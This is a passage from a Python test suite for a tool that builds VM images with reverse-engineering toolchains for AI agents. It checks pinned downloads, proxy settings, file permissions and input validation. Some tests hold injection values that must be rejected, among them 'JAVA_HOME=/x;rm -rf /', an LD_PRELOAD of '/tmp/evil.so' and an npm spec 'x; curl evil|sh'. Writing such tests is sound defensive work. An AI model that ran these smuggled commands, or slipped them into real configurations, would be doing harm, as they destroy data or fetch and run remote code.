        gh = json.loads(user_data(C.DEFAULT_CONFIG, ["ghidra"]).split("\n", 1)[1])
        self.assertEqual({w["path"] for w in gh["write_files"]} & {"/opt/ghidra-scripts/ExportDecompiled.java",
                         "/opt/ghidra-scripts/ghidra-decompile"}, {"/opt/ghidra-scripts/ExportDecompiled.java",
                                                                  "/opt/ghidra-scripts/ghidra-decompile"})
        ghs = base64.b64decode([w for w in gh["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
                               ["content"]).decode()
        self.assertIn("ddac49f903da9d5bac833e5cc79395098b9c33cfd3279be5f31bd00387d2d4db", ghs)  # from the release notes
        self.assertIn("GHIDRA_INSTALL_DIR=/opt/ghidra", ghs)
        self.assertIn("grep -q 'cilly_answer' /tmp/cilly-ghidra/out/answer.c", ghs)  # decompiles a program made in the build
        doc = json.loads(user_data(C.DEFAULT_CONFIG, ["decompilers"]).split("\n", 1)[1])
        self.assertIn("openjdk-25-jdk-headless", doc["packages"])
        jd = [w for w in doc["write_files"] if w["path"] == "/opt/decompilers/jar-diff"][0]
        self.assertEqual((jd["owner"], jd["permissions"]), ("root:root", "0755"))
        script = base64.b64decode([w for w in doc["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
                                  ["content"]).decode()
        get = script.index("vineflower-1.12.0.jar' -o /opt/decompilers/vineflower.jar.part")
        self.assertLess(get, script.index("sha256sum -c -", get))  # checked before it's moved into place
        self.assertLess(script.index("sha256sum -c -", get), script.index("mv /opt/decompilers/vineflower.jar.part"))
        self.assertLess(script.index("toolchain java"), script.index("toolchain decompilers"))
        self.assertIn("jar-diff /tmp/cilly-decompilers/v1.jar", script)  # really run on a jar made during the build
        self.assertIn("echo 'f686e8f3ded377d7bc87d216a90e9e9512df4156e75b06c655a16648ae8765b2  /opt/decompilers/cfr.jar.part' "
                      "| sha256sum -c -", script)  # CFR, pinned like Vineflower
        self.assertIn("grep -q 'return \"Hello\";' /tmp/cilly-decompilers/cfr/Hello.java", script)

    def test_ghidra_decompile_wrapper(self):
        from cilly.base_image import GUEST_DIR
        with tempfile.TemporaryDirectory() as d:
            ghidra = os.path.join(d, "ghidra", "support")
            os.makedirs(ghidra)
            with open(os.path.join(ghidra, "analyzeHeadless"), "w") as f:  # writes the C file the script would
                f.write('#!/bin/sh\n[ -n "$SLEEP" ] && { date +%s.%N >> "$CALLS.start"; sleep "$SLEEP"; }\nprintf "%s\\n" "$@" > "$CALLS"\n'
                        'printf "%s" "${GHIDRA_HEADLESS_MAXMEM:-unset}" > "$CALLS.mem"\n'
                        'eval out=\\${$#}; [ -z "$NO_OUTPUT" ] && echo "int f(void);" > "$out/$(basename "$4").c"\nexit 0\n')
            os.chmod(os.path.join(ghidra, "analyzeHeadless"), 0o755)
            with open(os.path.join(GUEST_DIR, "ghidra-decompile")) as f:
                wrapper = os.path.join(d, "ghidra-decompile")
                with open(wrapper, "w") as w:
                    w.write(f.read().replace("/opt/ghidra/", os.path.join(d, "ghidra") + "/"))
            os.chmod(wrapper, 0o755)
            target = os.path.join(d, "my game.bin")
            open(target, "wb").close()
            home, calls = os.path.join(d, "home"), os.path.join(d, "calls")
            os.makedirs(home)
            env = dict(os.environ, HOME=home, CALLS=calls)
            run = lambda *a, **e: subprocess.run([wrapper, *a], env=dict(env, **e), capture_output=True, text=True, cwd=d)
            r = run(target, "out")
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(calls) as f:
                args = f.read().split("\n")[:-1]
            self.assertEqual(args, [os.path.join(home, "ghidra-projects"), "my_game.bin", "-import", target, "-overwrite",
                                    "-analysisTimeoutPerFile", "1200", "-scriptPath", "/opt/ghidra-scripts",
                                    "-postScript", "ExportDecompiled.java", os.path.join(d, "out")])
            self.assertEqual(run(target, "out3", GHIDRA_ANALYSIS_TIMEOUT="60").stdout, "")  # the timeout is overridable
            with open(calls) as f:
                self.assertIn("60", f.read().split("\n"))
            # the heap defaults to a share of memory, and the caller can override it
            run(target, "out4")
            self.assertRegex(open(calls + ".mem").read(), r"^\d+M$")
            run(target, "out5", GHIDRA_HEADLESS_MAXMEM="3000M")
            self.assertEqual(open(calls + ".mem").read(), "3000M")
            self.assertTrue(os.path.isfile(os.path.join(d, "out", "my game.bin.c")))
            self.assertEqual(run(target, "out2", NO_OUTPUT="1").returncode, 1)  # no C file: it says so
            old = os.path.join(d, "out", "my game.bin.c")  # what an earlier run left
            os.utime(old, (time.time() - 3600,) * 2)
            self.assertEqual(run(target, "out", NO_OUTPUT="1").returncode, 1)  # doesn't count for this one
            self.assertEqual([n for n in os.listdir(os.path.join(d, "out")) if n.startswith(".")], [])  # its marker is gone
            self.assertEqual(run(os.path.join(d, "missing"), "out").returncode, 1)
            self.assertEqual(run(target).returncode, 2)
            # subagents calling it at once: the second waits for the first, as two would run the VM out of memory
            first = subprocess.Popen([wrapper, target, "out6"], env=dict(env, SLEEP="1"), cwd=d, stderr=subprocess.PIPE, text=True)
            time.sleep(0.3)
            second = run(target, "out7", SLEEP="0.1")
            first.wait(10)
            self.assertEqual((first.returncode, second.returncode), (0, 0), second.stderr)
            self.assertIn("another one is running, so this one waits for it", second.stderr)
            starts = [float(x) for x in open(calls + ".start").read().split()]
            self.assertGreaterEqual(starts[1] - starts[0], 0.95)  # it started once the first was done

    def test_rea_is_pinned_all_the_way_down(self):
        from cilly.base_image import GUEST_DIR, NODE, REA, RECIPES
        with open(os.path.join(GUEST_DIR, "rea", "package-lock.json")) as f:
            lock = json.load(f)
        self.assertEqual(lock["packages"][""]["dependencies"], {"rea-agents": REA})  # exact, no range
        deps = {k: v for k, v in lock["packages"].items() if k}
        self.assertEqual(deps["node_modules/rea-agents"]["version"], REA)
        for name, p in deps.items():  # every package fixed by version and integrity, from the registry
            self.assertTrue(p["integrity"].startswith("sha512-") and p["resolved"].startswith("https://registry.npmjs.org/"), name)
        with open(os.path.join(GUEST_DIR, "rea", "pwntools.txt")) as f:
            pins = [ln for ln in f.read().splitlines() if ln and not ln.startswith("#")]
        for ln in pins:
            self.assertRegex(ln, r"^[A-Za-z0-9_.-]+==[0-9][^ ]* --hash=sha256:[0-9a-f]{64}$")
        names = {ln.split("==")[0]: ln.split("==")[1].split()[0] for ln in pins}
        self.assertEqual((names["pwntools"], names["pyelftools"], names["unicorn"]), ("4.15.0", "0.33", "2.1.2"))  # what REA needs
        self.assertEqual(names["capstone"], "5.0.9")  # the stable release, not the 6.0.0a pre-release pip would pick
        from cilly.base_image import PRESETS
        self.assertTrue(RECIPES["rea"].get("optional"))
        self.assertNotIn("rea", PRESETS["full"]["toolchains"])  # large, like Ghidra
        self.assertIn("npm cache clean --force", RECIPES["rea"]["script"])
        self.assertIn("/etc/pwn.conf", RECIPES["rea"]["script"])
        self.assertIn("chmod -R a+rX,go-w /opt/rea /opt/rizin", RECIPES["rea"]["script"])  # tar as root keeps modes
        r = RECIPES["rea"]
        self.assertIn("java", r["needs"])  # JADX and Apktool need a JDK
        self.assertIn(f"node-v{NODE}-linux-x64.tar.xz", r["downloads"][0]["url"])
        self.assertIn("npm ci --ignore-scripts", r["script"])  # frida's install script would download binaries
        self.assertIn("--require-hashes --no-deps --only-binary=:all:", r["script"])
        paths = [ln for ln in r["script"].splitlines() if ln.startswith('echo "PATH=')]
        self.assertEqual(paths, ['echo "PATH=/opt/rizin/bin" >> /etc/cilly/toolchains.env'])  # Node stays off PATH
        self.assertTrue(any("execute-rizin-command" in c and "cilly_answer" in c for c in r["check"]))  # a real analysis

    def test_rea_wrapper_keeps_it_from_updating(self):
        from cilly.base_image import GUEST_DIR
        with tempfile.TemporaryDirectory() as d:
            node = os.path.join(d, "node")
            with open(node, "w") as f:  # prints what it was asked to run
                f.write('#!/bin/sh\necho "NO_UPDATE_NOTIFIER=$NO_UPDATE_NOTIFIER $*"\n')
            os.chmod(node, 0o755)
            with open(os.path.join(GUEST_DIR, "rea", "rea")) as f:
                wrapper = os.path.join(d, "rea")
                with open(wrapper, "w") as w:
                    w.write(f.read().replace("/opt/rea/node/bin/node", node))
            os.chmod(wrapper, 0o755)
            run = lambda *a: subprocess.run([wrapper, *a], capture_output=True, text=True)
            for args in (["update"], ["setup"], ["mcp", "add"], ["--update"], ["analyze", "x", "--update"],
                         ["--json", "update"], ["--incur-update-check"]):
                r = run(*args)
                self.assertEqual((r.returncode, r.stdout), (2, ""), args)
                self.assertIn("turned off here", r.stderr)
                self.assertNotIn(";", r.stderr)  # plain sentences
            self.assertEqual(run("--json", "analyze", "x").returncode, 0)  # a real command with a flag goes through
            r = run("mcp")
            self.assertEqual(r.stdout.strip(), "NO_UPDATE_NOTIFIER=1 /opt/rea/app/node_modules/rea-agents/scripts/rea.mjs mcp")
            self.assertEqual(run("analyze", "a b").stdout.strip().split(" ", 2)[2], "analyze a b")

    def test_java_and_maven_use_the_egress_proxy(self):
        """Java ignores HTTPS_PROXY, so Maven and Gradle couldn't reach Maven Central or the Gradle wrapper."""
        import xml.etree.ElementTree as ET
        from cilly.base_image import PROXY, RECIPES
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp)
        os.makedirs(os.path.join(tmp, "jdk", "conf"))
        with open(os.path.join(tmp, "jdk", "conf", "net.properties"), "w") as f:
            f.write("http.nonProxyHosts=localhost|127.*|[::1]\n")
        script = RECIPES["java"]["script"].split("\n# Java ignores", 1)[1].split("\n", 1)[1]  # the proxy lines only
        script = script.replace("/etc/maven/settings.xml", os.path.join(tmp, "settings.xml"))
        subprocess.run(["bash", "-euc", f"jh={tmp}/jdk\n" + script], check=True)
        with open(os.path.join(tmp, "jdk", "conf", "net.properties")) as f:
            props = dict(ln.split("=", 1) for ln in f.read().split())
        host, port = PROXY.removeprefix("http://").split(":")
        self.assertEqual((props["https.proxyHost"], props["https.proxyPort"], props["http.proxyHost"]), (host, port, host))
        self.assertEqual(props["http.nonProxyHosts"], "localhost|127.*|[::1]")  # Debian's own line stays
        proxies = ET.parse(os.path.join(tmp, "settings.xml")).getroot().findall("proxies/proxy")
        self.assertEqual(sorted((p.findtext("protocol"), p.findtext("host"), p.findtext("port"), p.findtext("active")) for p in proxies),
                         [("http", host, port, "true"), ("https", host, port, "true")])

    def test_downloads_use_a_safe_character_set(self):
        from cilly.base_image import RECIPES
        url = r"^https://[A-Za-z0-9._~:/?#@!*+,=%-]+$"  # nothing the shell gives a meaning to inside or around quotes
        for bad in ("https://a/'x", "https://a/$x", "https://a/x;y", "https://a/x&y", "https://a/(x)", "https://a/`x`"):
            self.assertNotRegex(bad, url)
        for t, r in RECIPES.items():
            for d in r.get("downloads", []):
                self.assertRegex(d["to"], r"^/opt/[A-Za-z0-9._/-]+$", t)
                self.assertRegex(d["url"], url, t)
                self.assertRegex(d["sha256"], r"^[0-9a-f]{64}$", t)

    def test_each_installed_file_gets_a_fitting_mode(self):
        from cilly import config as C
        from cilly.base_image import RECIPES, _file_mode, user_data
        for t, r in RECIPES.items():
            for dest, src in r.get("files", {}).items():
                want = _file_mode(src)
                with open(os.path.join(os.path.dirname(user_data.__code__.co_filename), "guest", src), "rb") as f:
                    self.assertEqual(want, "0755" if f.read(2) == b"#!" else "0644", src)
        doc = json.loads(user_data(C.DEFAULT_CONFIG, list(RECIPES)).split("\n", 1)[1])
        modes = {w["path"]: w["permissions"] for w in doc["write_files"]}
        self.assertEqual(modes["/opt/decompilers/jar-diff"], "0755")  # a program

    def test_needs_are_resolved_recursively_with_a_cycle_check(self):
        from unittest import mock
        from cilly.base_image import RECIPES, check_toolchains
        fake = dict(RECIPES)
        base = dict(RECIPES["cpp"])
        fake["layer1"] = {**base, "needs": ["java"]}
        fake["layer2"] = {**base, "needs": ["layer1"]}  # a need that itself has a need
        fake["loopa"] = {**base, "needs": ["loopb"]}
        fake["loopb"] = {**base, "needs": ["loopa"]}
        with mock.patch.dict("cilly.base_image.RECIPES", fake, clear=True):
            self.assertEqual(check_toolchains(["layer2"]), ["java", "layer1", "layer2"])  # deepest first
            with self.assertRaisesRegex(ValueError, "needs itself"):
                check_toolchains(["loopa"])

    def test_the_build_fetches_over_https_only(self):
        from cilly import config as C
        from cilly.base_image import user_data
        import base64
        doc = json.loads(user_data(C.DEFAULT_CONFIG, ["decompilers"]).split("\n", 1)[1])
        script = base64.b64decode([w for w in doc["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
                                  ["content"]).decode()
        got = [ln for ln in script.splitlines() if ln.startswith("curl ") and ".part" in ln]
        self.assertTrue(got)
        for line in got:  # every pinned download is https only, redirects included
            self.assertIn("--proto '=https'", line)
            self.assertIn("--proto-redir '=https'", line)

    def test_ghidra_build_leaves_nothing_world_writable(self):
        from cilly import config as C
        from cilly.base_image import user_data
        import base64
        doc = json.loads(user_data(C.DEFAULT_CONFIG, ["ghidra"]).split("\n", 1)[1])
        script = base64.b64decode([w for w in doc["write_files"] if w["path"] == "/usr/local/sbin/cilly-build-finish"][0]
                                  ["content"]).decode()
        self.assertIn("chmod -R a+rX,go-w /opt/ghidra", script)  # strip world-write after unzip
        self.assertLess(script.index("toolchain ghidra"), script.index("find /opt"))  # and the build checks after it
        check = script[script.index("if [ -d /opt ]"):script.index("echo CILLY-BUILD-OK")]
        with tempfile.TemporaryDirectory() as d:
            opt = os.path.join(d, "opt")
            run = lambda: subprocess.run(["bash", "-euo", "pipefail", "-c", check.replace("/opt", opt)],
                                         capture_output=True, text=True)
            self.assertEqual(run().returncode, 0)  # no /opt at all: fine
            os.makedirs(os.path.join(opt, "tool", "lib"))
            open(os.path.join(opt, "tool", "lib", "a.so"), "w").close()
            os.symlink("a.so", os.path.join(opt, "tool", "lib", "b.so"))  # a link is 0777 by itself
            self.assertEqual(run().returncode, 0)
            for p, mode in (("tool/lib", 0o777), ("tool/lib/a.so", 0o666)):
                os.chmod(os.path.join(opt, p), mode)
                r = run()
                self.assertEqual(r.returncode, 1, p)
                self.assertIn(p, r.stdout)
                os.chmod(os.path.join(opt, p), 0o755)

    def test_the_agents_bash_limit_reaches_claude_as_text(self):
        r = load_runner()
        task = {"agent_env": {"BASH_MAX_TIMEOUT_MS": "2700000", "X": 5}, "env": {"GH_TOKEN": "t"}}
        with mock.patch.object(r.pwd, "getpwnam", return_value=pwd.getpwuid(os.getuid())), \
                mock.patch.object(r, "toolchain_env", lambda *a: {}):
            env = r.agent_env({}, task)
        self.assertEqual((env["BASH_MAX_TIMEOUT_MS"], env["X"], env["GH_TOKEN"]), ("2700000", "5", "t"))

    def test_this_starts_ca_is_trusted_and_reaches_node(self):
        """Keeping tokens on the PC: the VM trusts the CA made for this start, Node included,
        and an empty or bad one is never trusted."""
        r = load_runner()
        pem = "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----\n"
        with tempfile.TemporaryDirectory() as d:
            ca = os.path.join(d, "certs", "cilly-agent-vm.crt")
            calls = []
            run = lambda argv, **kw: calls.append(argv) or subprocess.CompletedProcess(argv, 0, b"", b"")  # noqa: E731
            with mock.patch.object(r, "CA_FILE", ca), mock.patch.object(r.subprocess, "run", run), \
                    mock.patch.object(r.pwd, "getpwnam", return_value=pwd.getpwuid(os.getuid())), \
                    mock.patch.object(r, "toolchain_env", lambda *a: {}), \
                    mock.patch.object(r.os, "chown", lambda *a: None):  # root's in the VM; CI isn't root
                r.install_ca({"ca": pem})
                with open(ca) as f:
                    self.assertEqual(f.read(), pem)
                self.assertEqual(calls[-1], ["update-ca-certificates", "--fresh"])
                self.assertEqual(r.agent_env({}, {})["NODE_EXTRA_CA_CERTS"], ca)
                r.install_ca({"ca": "not a certificate"})  # never trusted
                self.assertFalse(os.path.exists(ca))
                r.install_ca({"ca": None})
                self.assertNotIn("NODE_EXTRA_CA_CERTS", r.agent_env({}, {}))
                n = len(calls)
                r.install_ca({})  # none before and none now: nothing to do
                self.assertEqual(len(calls), n)

    def test_toolchain_env_is_strict(self):
        r = load_runner()
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "toolchains.env")
            with open(p, "w") as f:
                f.write("JAVA_HOME=/usr/lib/jvm/java-25-openjdk-amd64\nRUSTUP_HOME=/opt/rust/rustup\nPATH=/opt/rust/cargo/bin\n"
                        "LD_PRELOAD=/tmp/evil.so\nPATH=relative/bin\nJAVA_HOME=/x;rm -rf /\nPATH=/a/../../etc\n"
                        "PLAYWRIGHT_BROWSERS_PATH=/opt/ms-playwright\nNODE_PATH=/usr/local/lib/node_modules\nNODE_OPTIONS=/x\n"
                        "GHIDRA_INSTALL_DIR=/opt/ghidra\nGHIDRA_MAXMEM=/x\n"
                        "REA_JADX_MCP_JAR=/opt/rea/jadx-headless-mcp.jar\nREA_PWNTOOLS_PYTHON=/opt/rea/pwntools/bin/python\n"
                        "REA_TSHARK_COMMAND=/usr/bin/tshark\nREA_BROWSER_EXECUTABLE=/tmp/x\n")
            self.assertEqual(r.toolchain_env(p), {"JAVA_HOME": "/usr/lib/jvm/java-25-openjdk-amd64",
                                                  "RUSTUP_HOME": "/opt/rust/rustup", "PATH": "/opt/rust/cargo/bin",
                                                  "PLAYWRIGHT_BROWSERS_PATH": "/opt/ms-playwright",
                                                  "NODE_PATH": "/usr/local/lib/node_modules",
                                                  "GHIDRA_INSTALL_DIR": "/opt/ghidra",
                                                  "REA_JADX_MCP_JAR": "/opt/rea/jadx-headless-mcp.jar",
                                                  "REA_PWNTOOLS_PYTHON": "/opt/rea/pwntools/bin/python",
                                                  "REA_TSHARK_COMMAND": "/usr/bin/tshark"})
            self.assertEqual(r.toolchain_env(os.path.join(d, "missing")), {})

    def test_no_new_privs_is_set_and_inherited(self):
        code = ("import importlib.util as u, subprocess, sys; s = u.spec_from_file_location('r', sys.argv[1]); "
                "r = u.module_from_spec(s); s.loader.exec_module(r); r.set_no_new_privs(); "
                "print(r._no_new_privs(), subprocess.run(['grep', 'NoNewPrivs', '/proc/self/status'], "
                "capture_output=True, text=True).stdout.split()[-1])")
        out = subprocess.run([sys.executable, "-I", "-c", code, RUNNER], capture_output=True, text=True, timeout=30)
        self.assertEqual(out.stdout.split(), ["set", "1"], out.stderr)  # the runner and what it starts

    def test_selftest_checks_run_at_the_same_time(self):
        r = load_runner()
        def boom():
            raise OSError("no network")
        t = time.monotonic()
        got = r.run_all([lambda: (time.sleep(0.6), "a")[1], lambda: (time.sleep(0.6), "b")[1], boom, lambda: "c"])
        self.assertLess(time.monotonic() - t, 1.1)  # one after another, it takes 1.2 s
        self.assertEqual(got, ["a", "b", "error (OSError)", "c"])  # in order, and a check that breaks fails
        self.assertEqual(r.run_all([]), [])

    def test_selftest_finds_setuid_programs(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, "bin"))
            p = os.path.join(d, "bin", "su")
            with open(p, "w") as f:
                f.write("#!/bin/sh\n")
            os.chmod(p, 0o755)
            r = load_runner()
            self.assertEqual(r._setuid_programs((d,)), "none")
            os.chmod(p, 0o4755)
            self.assertEqual(r._setuid_programs((d,)), p)

    def test_rejects_weird_npm_spec(self):
        import copy
        from cilly import config as C
        from cilly.base_image import user_data
        c = copy.deepcopy(C.DEFAULT_CONFIG)
        c["agents"]["claude"]["npm_package"] = "x; curl evil|sh"
        with self.assertRaises(ValueError):
            user_data(c)


if __name__ == "__main__":
    unittest.main()
